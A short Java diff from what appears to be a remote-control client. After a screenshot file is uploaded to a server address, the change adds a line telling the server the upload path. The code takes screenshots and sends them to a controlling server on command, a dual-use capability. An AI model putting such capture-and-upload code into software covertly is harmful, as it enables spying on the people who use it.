@@ -98,6 +98,7 @@ public class FuncPrtScr implements AbstractFunc {
 				try {
 					//发送到服务器
 					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
+					writeToServerIgnoreException("!sendpicurl "+"prtscr/"+ ClientMain.name+"!");
 				}catch (Exception e){
 					writeToServerIgnoreException("无法将截图上传至服务器"+"\n");
 				}
